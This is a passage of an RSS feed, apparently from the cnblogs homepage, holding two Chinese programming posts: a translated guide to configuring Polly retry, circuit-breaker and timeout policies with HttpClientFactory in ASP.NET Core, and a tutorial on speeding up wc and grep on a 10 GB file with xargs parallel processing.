<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>在 .NET Core 中结合 HttpClientFactory 使用 Polly（中篇） - Liam Wang</title>
<link>http://www.cnblogs.com/willick/p/HttpClientFactory-Polly-2.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/willick/p/HttpClientFactory-Polly-2.html</guid>
<description>&lt;blockquote readability=&quot;6.5092250922509&quot;&gt;
&lt;p&gt;译者：王亮&lt;br/&gt;作者：Polly 团队&lt;br/&gt;原文：&lt;a href=&quot;http://t.cn/EhZ90oq&quot;&gt;http://t.cn/EhZ90oq&lt;/a&gt;&lt;br/&gt;声明：我翻译技术文章不是逐句翻译的，而是根据我自己的理解来表述的（包括标题）。其中可能会去除一些不影响理解但本人实在不知道如何组织的句子&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;译者序：这是“&lt;a href=&quot;https://github.com/App-vNext/Polly/wiki/Polly-and-HttpClientFactory&quot; target=&quot;_blank&quot;&gt;Polly and HttpClientFactory&lt;/a&gt;”这篇Wiki文档翻译的中篇，你可以 &lt;a href=&quot;https://mp.weixin.qq.com/s/VfyrwARblQJgS7D2Q_Ny6A&quot;&gt;点击这里查看上篇&lt;/a&gt;。接下来的两篇则是在这个基础上进行加强。本篇（中篇）主要讲如何在ASP.NET Core中通过HttpClientFactory配置Polly策略。如果你对ASP.NET Core 2.1新引入的HttpClient工厂还比较陌生，建议先阅读我的另一篇文章 &lt;a href=&quot;https://mp.weixin.qq.com/s/HGi95iyyLh2IyNPem30mrQ&quot;&gt;.NET Core中正确使用 HttpClient的姿势&lt;/a&gt;，这有助于更好地理解本文。&lt;/p&gt;
&lt;center&gt;&lt;span&gt;—— 正文 ——&lt;/span&gt;&lt;/center&gt;
&lt;p&gt;下面主要讲如何在ASP.NET Core中通过HttpClientFactory配置Polly策略。&lt;/p&gt;
&lt;h2 id=&quot;-addtransienthttperrorpolicy&quot;&gt;使用 AddTransientHttpErrorPolicy&lt;/h2&gt;
&lt;p&gt;让我们先回到上篇的例子：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs language-csharp&quot;&gt;services.AddHttpClient(&lt;span class=&quot;hljs-string&quot;&gt;&quot;GitHub&quot;&lt;/span&gt;, client =&amp;gt;&lt;br/&gt;{&lt;br/&gt;client.BaseAddress = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; Uri(&lt;span class=&quot;hljs-string&quot;&gt;&quot;https://api.github.com/&quot;&lt;/span&gt;);&lt;br/&gt;client.DefaultRequestHeaders.Add(&lt;span class=&quot;hljs-string&quot;&gt;&quot;Accept&quot;&lt;/span&gt;, &lt;span class=&quot;hljs-string&quot;&gt;&quot;application/vnd.github.v3+json&quot;&lt;/span&gt;);&lt;br/&gt;})&lt;br/&gt;.AddTransientHttpErrorPolicy(builder =&amp;gt; builder.WaitAndRetryAsync(&lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt;[]&lt;br/&gt;{&lt;br/&gt;TimeSpan.FromSeconds(&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;),&lt;br/&gt;TimeSpan.FromSeconds(&lt;span class=&quot;hljs-number&quot;&gt;5&lt;/span&gt;),&lt;br/&gt;TimeSpan.FromSeconds(&lt;span class=&quot;hljs-number&quot;&gt;10&lt;/span&gt;)&lt;br/&gt;}));
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里用了一个新的AddTransientHttpErrorPolicy方法，它可以很方便地配置一个策略来处理下面这些典型的HTTP调用错误：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;网络错误（HttpRequestException 异常）&lt;/li&gt;
&lt;li&gt;HTTP状态码 5XX（服务器错误）&lt;/li&gt;
&lt;li&gt;HTTP状态码 408（请求超时）&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;AddTransientHttpErrorPolicy方法添加了一个策略，这个策略默认预配置了上面HTTP错误的过滤器。在builder =&amp;gt; builder子句中，你可以定义策略如何处理这些错误，还可以配置Polly提供的其它策略，比如重试（如上例所示）、断路或回退等。&lt;/p&gt;
&lt;p&gt;在AddTransientHttpErrorPolicy中处理网络错误、HTTP 5XX和HTTP 408是一种便捷的方式，但这不是必需的。如果此方法内置的错误过滤器不适合您的需要（你需要仔细考虑一下），您可以扩展它，或者构建一个完全定制的Polly策略。&lt;/p&gt;
&lt;h2 id=&quot;-addtransienthttperrorpolicy&quot;&gt;扩展 AddTransientHttpErrorPolicy&lt;/h2&gt;
&lt;p&gt;AddTransientHttpErrorPolicy方法也可以从Polly的一个扩展包Polly.Extensions.Http中得到，它在上面的基础上进行了扩展。例如下面配置的策略可以处理429状态码：&lt;/p&gt;
&lt;pre readability=&quot;4.5&quot;&gt;
&lt;code class=&quot;hljs language-csharp&quot; readability=&quot;3&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;using&lt;/span&gt; Polly.Extensions.Http;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; policy = HttpPolicyExtensions&lt;br/&gt;.HandleTransientHttpError() &lt;br/&gt;.OrResult(response =&amp;gt; (&lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt;)response.StatusCode == &lt;span class=&quot;hljs-number&quot;&gt;429&lt;/span&gt;) &lt;br/&gt;.WaitAndRetryAsync();
&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;-polly-&quot;&gt;使用典型Polly语法配置好的策略&lt;/h2&gt;
&lt;p&gt;Polly 还有另一个扩展方法是AddPolicyHandler，它的一个重载方法可以接收任意IAsyncPolicy参数，所以你可以用典型的Polly语法先定义好任意的一个策略（返回类型为IAsyncPolicy），然后再传给AddPolicyHandler扩展方法。&lt;/p&gt;
&lt;p&gt;下面这个例子演示了用AddPolicyHandler来添加一个策略，其中我们编写了自己的错误处理策略：&lt;/p&gt;
&lt;pre readability=&quot;6&quot;&gt;
&lt;code class=&quot;hljs language-csharp&quot; readability=&quot;6&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; retryPolicy = Policy.Handle&amp;lt;HttpRequestException&amp;gt;()&lt;br/&gt;.OrResult&amp;lt;HttpResponseMessage&amp;gt;(response =&amp;gt; MyCustomResponsePredicate(response))&lt;br/&gt;.WaitAndRetryAsync(&lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt;[]&lt;br/&gt;{&lt;br/&gt;TimeSpan.FromSeconds(&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;),&lt;br/&gt;TimeSpan.FromSeconds(&lt;span class=&quot;hljs-number&quot;&gt;5&lt;/span&gt;),&lt;br/&gt;TimeSpan.FromSeconds(&lt;span class=&quot;hljs-number&quot;&gt;10&lt;/span&gt;)&lt;br/&gt;}));&lt;p&gt;services.AddHttpClient(&lt;span class=&quot;hljs-string&quot;&gt;&quot;GitHub&quot;&lt;/span&gt;, client =&amp;gt;&lt;br/&gt;{&lt;br/&gt;client.BaseAddress = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; Uri(&lt;span class=&quot;hljs-string&quot;&gt;&quot;https://api.github.com/&quot;&lt;/span&gt;);&lt;br/&gt;client.DefaultRequestHeaders.Add(&lt;span class=&quot;hljs-string&quot;&gt;&quot;Accept&quot;&lt;/span&gt;, &lt;span class=&quot;hljs-string&quot;&gt;&quot;application/vnd.github.v3+json&quot;&lt;/span&gt;);&lt;br/&gt;})&lt;br/&gt;.AddPolicyHandler(retryPolicy);
&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;类似的，你还可以配置其它策略，比如超时策略：&lt;/p&gt;
&lt;pre readability=&quot;4&quot;&gt;
&lt;code class=&quot;hljs language-csharp&quot; readability=&quot;2&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; timeoutPolicy = Policy.TimeoutAsync&amp;lt;HttpResponseMessage&amp;gt;(&lt;span class=&quot;hljs-number&quot;&gt;10&lt;/span&gt;);&lt;p&gt;services.AddHttpClient()&lt;br/&gt;.AddPolicyHandler(timeoutPolicy);
&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;所有通过HttpClient的调用返回的都是一个HttpResponseMessage对象，因此配置的策略必须是IAsyncPolicy对象（译注：HTTP请求返回的是HttpResponseMessage对象，Polly定义的策略是一个IAsyncPolicy对象，所以AddPolicyHandler方法接收的参数是这两者的结合体IAsyncPolicy对象）。非泛型的IAsyncPolicy可以通过下面的方式转换成泛型的IAsyncPolicy：&lt;/p&gt;
&lt;pre readability=&quot;4&quot;&gt;
&lt;code class=&quot;hljs language-csharp&quot; readability=&quot;2&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; timeoutPolicy = Policy.TimeoutAsync(&lt;span class=&quot;hljs-number&quot;&gt;10&lt;/span&gt;);&lt;p&gt;services.AddHttpClient()&lt;br/&gt;.AddPolicyHandler(timeoutPolicy.AsAsyncPolicy&amp;lt;HttpResponseMessage&amp;gt;());
&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;-&quot;&gt;应用多个策略&lt;/h2&gt;
&lt;p&gt;所有策略配置的方法也可以链式地配置多个策略，例如：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs language-csharp&quot;&gt;services.AddHttpClient()&lt;br/&gt;.AddTransientHttpErrorPolicy(builder =&amp;gt; builder.WaitAndRetryAsync(&lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt;[]&lt;br/&gt;{&lt;br/&gt;TimeSpan.FromSeconds(&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;),&lt;br/&gt;TimeSpan.FromSeconds(&lt;span class=&quot;hljs-number&quot;&gt;5&lt;/span&gt;),&lt;br/&gt;TimeSpan.FromSeconds(&lt;span class=&quot;hljs-number&quot;&gt;10&lt;/span&gt;)&lt;br/&gt;}))&lt;br/&gt;.AddTransientHttpErrorPolicy(builder =&amp;gt; builder.CircuitBreakerAsync(&lt;br/&gt;handledEventsAllowedBeforeBreaking: &lt;span class=&quot;hljs-number&quot;&gt;3&lt;/span&gt;,&lt;br/&gt;durationOfBreak: TimeSpan.FromSeconds(&lt;span class=&quot;hljs-number&quot;&gt;30&lt;/span&gt;)&lt;br/&gt;));
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;-&quot;&gt;多个策略被应用的顺序&lt;/h3&gt;
&lt;p&gt;当您配置多个策略时（如上例所示），策略应用于从外部（第一次配置）到内部（最后配置）的顺序依次调用。在上面的示例中，调用的顺序是这样的：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;首先通过（外部）重试策略，该策略将依次：&lt;/li&gt;
&lt;li&gt;通过（内部）断路策略的调用，该策略将依次：&lt;/li&gt;
&lt;li&gt;进行底层HTTP调用。&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/9608723/39209461-b9d004ec-47fd-11e8-8e16-0a378a9ee871.PNG&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这个示例之所以用此顺序的策略是因为当重试策略在两次尝试之间等待时，断路器可能在其中一个时间段（1、5或10秒）内改变状态（译注：上面示例中断路策略是出现3次异常就“休息”30分钟）。断路策略被配置在重试策略的内部，因此每执行一次重试就会执行其内部的断路策略。&lt;/p&gt;
&lt;p&gt;上面的例子应用了两个策略（重试和断路），任意数量的策略都是可以的。一个常见的多个策略组合可能是这样的：重试、断路和超时（“下篇”会有例子）。&lt;/p&gt;
&lt;p&gt;对于那些熟悉Polly的策略包的人来说，使用上面的方式配置多个策略完全等同于使用策略包，也适用于所有“策略包的使用建议”（链接：&lt;a href=&quot;http://t.cn/EhJ4jfN%EF%BC%89%E3%80%82&quot;&gt;http://t.cn/EhJ4jfN）。&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;-&quot;&gt;动态选择策略&lt;/h2&gt;
&lt;p&gt;AddPolicyHandler的重载方法允许你根据HTTP请求动态选择策略。&lt;/p&gt;
&lt;p&gt;其中一个用例是对非等幂的操作应用不同的策略行为（译注：“等幂“指的是一个操作重复使用，始终都会得到同一个结果）。对于HTTP请求来说，POST操作通常不是幂等的（译注：比如注册），PUT操作应该是幂等的。所以对于给定的API可能不是一概而论的。比如，您可能想要定义一个策略，让它只重试GET请求，但不重试其他HTTP谓词，比如这个示例：&lt;/p&gt;
&lt;pre readability=&quot;4.5&quot;&gt;
&lt;code class=&quot;hljs language-csharp&quot; readability=&quot;3&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; retryPolicy = HttpPolicyExtensions&lt;br/&gt;.HandleTransientHttpError()&lt;br/&gt;.WaitAndRetryAsync(&lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt;[]&lt;br/&gt;{&lt;br/&gt;TimeSpan.FromSeconds(&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;),&lt;br/&gt;TimeSpan.FromSeconds(&lt;span class=&quot;hljs-number&quot;&gt;5&lt;/span&gt;),&lt;br/&gt;TimeSpan.FromSeconds(&lt;span class=&quot;hljs-number&quot;&gt;10&lt;/span&gt;)&lt;br/&gt;});&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; noOpPolicy = Policy.NoOpAsync().AsAsyncPolicy&amp;lt;HttpResponseMessage&amp;gt;();&lt;p&gt;services.AddHttpClient()&lt;br/&gt;.AddPolicyHandler(request =&amp;gt; request.Method == HttpMethod.Get ? retryPolicy : noOpPolicy);
&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;上面的空策略会被应用于所有非GET的请求。空策略只是一种占坑模式，实际上不做任何事情。&lt;/p&gt;
&lt;h2 id=&quot;-&quot;&gt;从策略的注册池中选择策略&lt;/h2&gt;
&lt;p&gt;Polly还提供了策略注册池（请参阅：&lt;a href=&quot;http://t.cn/Ehi1SQp&quot;&gt;http://t.cn/Ehi1SQp&lt;/a&gt; ），它相当于策略的存储中心，被注册的策略可以让你在应用程序的多个位置重用。AddPolicyHandler的一个重载方法允许您从注册池中选择策略。&lt;/p&gt;
&lt;p&gt;下面的示例使用IServiceCollection添加一个策略注册池服务，向注册池中添加一些策略，然后使用注册池中的不同策略定义两个调用逻辑。&lt;/p&gt;
&lt;pre readability=&quot;8.5&quot;&gt;
&lt;code class=&quot;hljs language-csharp&quot; readability=&quot;11&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; registry = services.AddPolicyRegistry();&lt;p&gt;registry.Add(&lt;span class=&quot;hljs-string&quot;&gt;&quot;defaultretrystrategy&quot;&lt;/span&gt;, &lt;br/&gt;HttpPolicyExtensions.HandleTransientHttpError().WaitAndRetryAsync());&lt;br/&gt;registry.Add(&lt;span class=&quot;hljs-string&quot;&gt;&quot;defaultcircuitbreaker&quot;&lt;/span&gt;, &lt;br/&gt;HttpPolicyExtensions.HandleTransientHttpError().CircuitBreakerAsync());&lt;/p&gt;&lt;p&gt;services.AddHttpClient()&lt;br/&gt;.AddPolicyHandlerFromRegistry(&lt;span class=&quot;hljs-string&quot;&gt;&quot;defaultretrystrategy&quot;&lt;/span&gt;);&lt;/p&gt;&lt;p&gt;services.AddHttpClient()&lt;br/&gt;.AddPolicyHandlerFromRegistry(&lt;span class=&quot;hljs-string&quot;&gt;&quot;defaultretrystrategy&quot;&lt;/span&gt;)&lt;br/&gt;.AddPolicyHandlerFromRegistry(&lt;span class=&quot;hljs-string&quot;&gt;&quot;defaultcircuitbreaker&quot;&lt;/span&gt;);
&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这个示例演示了从注册池中选择一个或多个策略应用在不同的HttpClient上，同一个策略被重复使用了两次。策略注册池的更复杂用例包括从外部动态更新注册池中的策略，以便在运行期间动态重新配置策略（请查阅 &lt;a href=&quot;http://t.cn/Ehidgqy&quot;&gt;http://t.cn/Ehidgqy&lt;/a&gt; 了解更多）。&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;相关阅读：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p id=&quot;activity-name&quot; class=&quot;rich_media_title&quot;&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/p-K3SZrzLuwTirHvT7ijUw&quot; target=&quot;_blank&quot;&gt;.NET 开源项目 Polly 介绍&lt;/a&gt;&lt;/p&gt;
&lt;p id=&quot;activity-name&quot; class=&quot;rich_media_title&quot;&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/VfyrwARblQJgS7D2Q_Ny6A&quot; target=&quot;_blank&quot;&gt;在 .NET Core 中结合 HttpClientFactory 使用 Polly（上篇）&lt;/a&gt;&lt;/p&gt;
&lt;p id=&quot;activity-name&quot; class=&quot;rich_media_title&quot;&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/dXaZhtUQUhKnx-WyEM92rA&quot; target=&quot;_blank&quot;&gt;在 .NET Core 中结合 HttpClientFactory 使用 Polly（下篇）&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;​&lt;/p&gt;
</description>
<pubDate>Sun, 07 Oct 2018 23:58:00 +0000</pubDate>
<dc:creator>Liam Wang</dc:creator>
<og:description>这是“Polly and HttpClientFactory”这篇Wiki文档翻译的中篇，主要讲如何在ASP.NET Core中通过HttpClientFactory配置Polly策略。</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/willick/p/HttpClientFactory-Polly-2.html</dc:identifier>
</item>
<item>
<title>shell高效处理文本(1)：xargs并行处理 - 骏马金龙</title>
<link>http://www.cnblogs.com/f-ck-need-u/p/9752365.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/f-ck-need-u/p/9752365.html</guid>
<description>&lt;p&gt;xargs具有并行处理的能力，在处理大文件时，如果应用得当，将大幅提升效率。&lt;/p&gt;
&lt;p&gt;xargs详细内容(全网最详细)：&lt;a href=&quot;https://www.cnblogs.com/f-ck-need-u/p/5925923.html#auto_id_17&quot;&gt;https://www.cnblogs.com/f-ck-need-u/p/5925923.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;先展示一下使用xargs并行处理提升的效率，稍后会解释下面的结果。&lt;/p&gt;
&lt;p&gt;测试环境：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;win10子系统上&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;32G内存&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;8核心cpu&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;测试对象是一个放在固态硬盘上行的10G文本文件(如果你需要此测试文件，&lt;a href=&quot;https://pan.baidu.com/s/1l17GJl0tTBFjDfZ_fRxDqA&quot;&gt;点此下载&lt;/a&gt;，提取码: semu)&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;下面是正常情况下&lt;code&gt;wc -l&lt;/code&gt;统计这个10G文件行数的结果，&lt;strong&gt;花费16秒，多次测试，cpu利用率基本低于80%&lt;/strong&gt;。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ /usr/bin/time wc -l 9.txt
999999953 9.txt
4.56user 3.14system 0:16.06elapsed 47%CPU (0avgtext+0avgdata 740maxresident)k
0inputs+0outputs (0major+216minor)pagefaults 0swaps&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;通过分割文件，使用xargs的并行处理功能进行统计，&lt;strong&gt;花费时间1.6秒，cpu利用率752%&lt;/strong&gt;：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ /usr/bin/time ./b.sh
999999953
7.67user 4.54system 0:01.62elapsed 752%CPU (0avgtext+0avgdata 1680maxresident)k
0inputs+0outputs (0major+23200minor)pagefaults 0swaps&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;用grep从这个10G的文本文件中筛选数据，&lt;strong&gt;花费时间24秒，cpu利用率36%&lt;/strong&gt;：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ /usr/bin/time grep &quot;10000&quot; 9.txt &amp;gt;/dev/null
6.17user 2.57system 0:24.19elapsed 36%CPU (0avgtext+0avgdata 1080maxresident)k
0inputs+0outputs (0major+308minor)pagefaults 0swaps&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;通过分割文件，使用xargs的并行处理功能进行统计，&lt;strong&gt;花费时间1.38秒，cpu利用率746%&lt;/strong&gt;：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ /usr/bin/time ./a.sh
6.01user 4.34system 0:01.38elapsed 746%CPU (0avgtext+0avgdata 1360maxresident)k
0inputs+0outputs (0major+31941minor)pagefaults 0swaps&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;速度提高的不是一点点。&lt;/p&gt;

&lt;p&gt;要使用xargs的并行功能，只需使用&quot;-P N&quot;选项即可，其中N是指定要运行多少个并行进程，如果指定为0，则使用尽可能多的并行进程数量。&lt;/p&gt;
&lt;p&gt;需要注意的是：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;既然要并行，那么xargs必须得分批传送管道的数据，xargs的分批选项有&quot;-n&quot;、&quot;-i&quot;、&quot;-L&quot;，如果不知道这些内容，看本文开头给出的文章。&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;并行进程数量应该设置为cpu的核心数量。如果设置为0，在处理时间较长的情况下，很可能会并发几百个甚至上千个进程。在我测试一个花费2分钟的操作时，创建了500多个进程。&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;在本文后面，还给出了其它几个注意事项。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;例如，一个简单的sleep命令，在不使用&quot;-P&quot;的时候，默认是一个进程按批的先后进行处理：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;[root@xuexi ~]# time echo {1..4} | xargs -n 1 sleep
 
real    0m10.011s
user    0m0.000s
sys     0m0.011s&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;总共用了10秒，因为每批传一个参数，第一批睡眠1秒，然后第二批睡眠2秒，依次类推，还有3秒、4秒，共1+2+3+4=10秒。&lt;/p&gt;
&lt;p&gt;如果使用-P指定4个处理进程，它将以处理时间最长的为准：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;[root@xuexi ~]# time echo {1..4} | xargs -n 1 -P 4 sleep
 
real    0m4.005s
user    0m0.000s
sys     0m0.007s&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;再例如，find找到一大堆文件，然后用grep去筛选：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;find /path -name &quot;*.log&quot; | xargs -i grep &quot;pattern&quot; {}
find /path -name &quot;*.log&quot; | xargs -P 4 -i grep &quot;pattern&quot; {}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;上面第一个语句，只有一个grep进程，一次处理一个文件，每次只被其中一个cpu进行调度。也就是说，它无论如何，都只用到了一核cpu的运算能力，在极端情况下，cpu的利用率是100%。&lt;/p&gt;
&lt;p&gt;上面第二个语句，开启了4个并行进程，一次可以处理从管道传来的4个文件，在同一时刻这4个进程最多可以被4核不同的CPU进行调度，在极端情况下，cpu的利用率是400%。&lt;/p&gt;

&lt;p&gt;下面是文章开头给出的实验结果对应的示例。一个10G的文本文件9.txt，这个文件里共有9.9亿(具体的是999999953)行数据。&lt;/p&gt;
&lt;p&gt;首先一个问题是，怎么统计这么近10亿行数据的？&lt;code&gt;wc -l&lt;/code&gt;，看看时间花费。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ /usr/bin/time wc -l 9.txt
999999953 9.txt
4.56user 3.14system 0:16.06elapsed 47%CPU (0avgtext+0avgdata 740maxresident)k
0inputs+0outputs (0major+216minor)pagefaults 0swaps&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;总共&lt;strong&gt;花费了16.06秒，cpu利用率是47%&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;随后，我把这10G数据用split切割成了100个小文件，在提升效率方面，split切割也算是妙用无穷：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;split -n l/100 -d -a 3 9.txt fs_&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这100个文件，每个105M，文件名都以&quot;fs_&quot;为前缀：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ ls -lh fs* | head -n 5
-rwxrwxrwx 1 root root 105M Oct  6 17:31 fs_000
-rwxrwxrwx 1 root root 105M Oct  6 17:31 fs_001
-rwxrwxrwx 1 root root 105M Oct  6 17:31 fs_002
-rwxrwxrwx 1 root root 105M Oct  6 17:31 fs_003
-rwxrwxrwx 1 root root 105M Oct  6 17:31 fs_004&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;然后，用xargs的并行处理来统计，以下是统计脚本&lt;code&gt;b.sh&lt;/code&gt;的内容：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;#!/usr/bin/env bash

find /mnt/d/test -name &quot;fs*&quot; |\
 xargs -P 0 -i wc -l {} |\
 awk '{sum += $1}END{print sum}'&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;上面用&lt;code&gt;-P 0&lt;/code&gt;选项指定了尽可能多地开启并发进程数量，如果要保证最高效率，应当设置并发进程数量等于cpu的核心数量(在我的机器上，应该设置为8)，因为在操作时间较久的情况下，可能会并行好几百个进程，这些进程之间进行切换也会消耗不少资源。&lt;/p&gt;
&lt;p&gt;然后，用这个脚本去统计测试：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ /usr/bin/time ./b.sh
999999953
7.67user 4.54system 0:01.62elapsed 752%CPU (0avgtext+0avgdata 1680maxresident)k
0inputs+0outputs (0major+23200minor)pagefaults 0swaps&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;只&lt;strong&gt;花了1.62秒，cpu利用率752%&lt;/strong&gt;。和前面单进程处理相比，时间是原来的16分之1，cpu利用率是原来的好多好多倍。&lt;/p&gt;
&lt;p&gt;再来用grep从这个10G的文本文件中筛选数据，例如筛选包含&quot;10000&quot;字符串的行：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ /usr/bin/time grep &quot;10000&quot; 9.txt &amp;gt;/dev/null
6.17user 2.57system 0:24.19elapsed 36%CPU (0avgtext+0avgdata 1080maxresident)k
0inputs+0outputs (0major+308minor)pagefaults 0swaps&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;24秒，cpu利用率36%&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;再次用xargs来处理，以下是脚本：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;#!/usr/bin/env bash

find /mnt/d/test -name &quot;fs*&quot; |\
 xargs -P 8 -i grep &quot;10000&quot; {} &amp;gt;/dev/null&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;测试结果：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ /usr/bin/time ./a.sh
6.01user 4.34system 0:01.38elapsed 746%CPU (0avgtext+0avgdata 1360maxresident)k
0inputs+0outputs (0major+31941minor)pagefaults 0swaps&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;花费时间1.38秒，cpu利用率746%&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;这比用什么ag、ack替代grep有效多了。&lt;/p&gt;

&lt;p&gt;xargs并行处理用的好，能大幅提升效率，但这是有条件的。&lt;/p&gt;
&lt;p&gt;首先要知道，xargs是如何提升效率的，以grep命令为例：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;ls fs* | xargs -i -P 8 grep 'pattern' {}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;之所以xargs能提高效率，是因为xargs可以分批传递管道左边的结果给不同的并发进程，也就是说，xargs要高效，得有多个文件可处理。对于上面的命令来说，ls可能输出了100个文件名，然后1次传递8个文件给8个不同的grep进程。&lt;/p&gt;
&lt;p&gt;还有一些注意事项：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1.如果只有单核心cpu，像提高效率，没门&lt;/strong&gt;&lt;br/&gt;&lt;strong&gt;2.xargs的高效来自于处理多个文件，如果你只有一个大文件，那么需要将它切割成多个小片段&lt;/strong&gt;&lt;br/&gt;&lt;strong&gt;3.由于是多进程并行处理不同的文件，所以命令的多行输出结果中，顺序可能会比较随机&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;例如，统计行数时，每个文件的出现顺序是不受控制的。&lt;/p&gt;
&lt;pre&gt;
